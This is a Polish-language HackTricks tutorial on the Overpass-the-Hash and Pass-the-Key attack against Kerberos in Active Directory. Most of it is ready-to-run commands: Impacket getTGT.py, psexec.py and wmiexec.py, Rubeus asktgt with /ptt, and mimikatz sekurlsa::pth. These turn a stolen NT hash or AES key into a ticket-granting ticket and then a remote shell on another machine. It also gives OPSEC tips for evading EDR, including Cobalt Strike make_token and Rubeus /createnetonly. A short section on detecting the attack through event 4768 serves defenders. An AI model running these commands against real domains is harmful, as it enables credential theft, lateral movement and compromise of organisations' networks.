# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest przeznaczony dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Atak ten wykorzystuje hash NTLM lub klucze AES użytkownika do uzyskania biletów Kerberos, umożliwiając nieautoryzowany dostęp do zasobów w sieci.

Ściśle mówiąc:

- **Over-Pass-the-Hash** zazwyczaj oznacza przekształcenie **hasha NT** w bilet Kerberos TGT za pomocą klucza Kerberos **RC4-HMAC**.
- **Pass-the-Key** to bardziej ogólna wersja, w której posiadasz już klucz Kerberos, taki jak **AES128/AES256**, i bezpośrednio żądasz biletu TGT przy jego użyciu.

Różnica ta ma znaczenie w hardened environments: jeśli **RC4 jest wyłączony** lub KDC nie zakłada już jego użycia, sam **hash NT nie wystarczy** i potrzebny jest **klucz AES** (lub hasło w postaci jawnej, aby go wyprowadzić).

Aby wykonać ten atak, pierwszym krokiem jest uzyskanie hasha NTLM lub hasła do konta docelowego użytkownika. Po uzyskaniu tych informacji można zdobyć Ticket Granting Ticket (TGT) dla tego konta, co pozwoli atakującemu uzyskać dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących poleceń:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
W scenariuszach wymagających AES256 można użyć opcji `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` obsługuje również żądanie **service ticket bezpośrednio przez AS-REQ** za pomocą `-service <SPN>`, co może być przydatne, gdy potrzebujesz ticketu dla konkretnego SPN bez dodatkowego TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Co więcej, uzyskany ticket może być używany z różnymi narzędziami, w tym `smbexec.py` lub `wmiexec.py`, poszerzając zakres ataku.

Napotykanie problemów, takich jak _PyAsn1Error_ lub _KDC cannot find the name_, jest zazwyczaj rozwiązywane przez aktualizację biblioteki Impacket lub użycie hostname zamiast adresu IP, co zapewnia kompatybilność z Kerberos KDC.

Alternatywna sekwencja poleceń z użyciem Rubeus.exe pokazuje inny aspekt tej techniki:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, koncentrując się na przejęciu i bezpośrednim wykorzystaniu biletu do uwierzytelniania. W praktyce:

- `Rubeus asktgt` samodzielnie wysyła **raw Kerberos AS-REQ/AS-REP** i nie wymaga uprawnień administratora, chyba że chcesz zaatakować inną sesję logowania za pomocą `/luid` lub utworzyć oddzielną sesję za pomocą `/createnetonly`.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` wstrzykuje dane uwierzytelniające do sesji logowania i w związku z tym **dotyka LSASS**, co zazwyczaj wymaga lokalnych uprawnień administratora lub `SYSTEM` i generuje więcej szumu z perspektywy EDR.

Przykłady z użyciem Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Aby zachować bezpieczeństwo operacyjne i używać AES256, można zastosować następujące polecenie:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` jest istotne, ponieważ ruch generowany przez Rubeus nieznacznie różni się od natywnego ruchu Windows Kerberos. Należy również pamiętać, że `/opsec` jest przeznaczone dla ruchu **AES256**; użycie go z RC4 zwykle wymaga `/force`, co niweluje znaczną część jego sensu, ponieważ **RC4 w nowoczesnych domenach samo w sobie jest silnym sygnałem**.

## Uwagi dotyczące wykrywania

Każde żądanie TGT generuje na DC **event `4768`**. W aktualnych kompilacjach Windows ten event zawiera więcej użytecznych pól, niż wspominają starsze opracowania:

- `TicketEncryptionType` informuje, jaki enctype został użyty dla wystawionego TGT. Typowe wartości to `0x17` dla **RC4-HMAC**, `0x11` dla **AES128** oraz `0x12` dla **AES256**.<sup>[[3]](#references)</sup>
- Zaktualizowane eventy udostępniają również `SessionKeyEncryptionType`, `PreAuthEncryptionType` oraz enctypes reklamowane przez klienta, co pomaga odróżnić **rzeczywistą zależność od RC4** od mylących starszych ustawień domyślnych.
- Występowanie `0x17` w nowoczesnym środowisku to dobra wskazówka, że konto, host lub ścieżka fallbacku KDC nadal zezwala na RC4, a tym samym jest bardziej przyjazna dla Over-Pass-the-Hash opartego na NT-hash.

Microsoft stopniowo ogranicza domyślne użycie RC4 od czasu aktualizacji wzmacniających Kerberos z listopada 2022 roku, a aktualne opublikowane wytyczne zalecają **usunięcie RC4 jako domyślnie zakładanego enctype dla AD DC do końca Q2 2026**. Z perspektywy ofensywnej oznacza to, że **Pass-the-Key z AES** staje się coraz bardziej niezawodną ścieżką, podczas gdy klasyczny **OpTH oparty wyłącznie na NT-hash** będzie coraz częściej kończył się niepowodzeniem w zahartowanych środowiskach.<sup>[[3]](#references)</sup>

Więcej informacji o typach szyfrowania Kerberos i powiązanym zachowaniu dotyczącym ticketów znajdziesz tutaj:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Wersja zapewniająca większą skrytość

> [!WARNING]
> Każda sesja logowania może mieć jednocześnie tylko jeden aktywny TGT, więc zachowaj ostrożność.

1. Utwórz nową sesję logowania za pomocą **`make_token`** z Cobalt Strike.
2. Następnie użyj Rubeus do wygenerowania TGT dla nowej sesji logowania bez wpływania na istniejącą sesję.

Podobną izolację można uzyskać bezpośrednio z Rubeus, korzystając z sesji **logon type 9** utworzonej do celów poświęcenia:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Pozwala to uniknąć nadpisania bieżącego TGT sesji i jest zazwyczaj bezpieczniejsze niż importowanie biletu do istniejącej sesji logowania.

## Referencje

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Wykrywanie i usuwanie użycia RC4 w Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
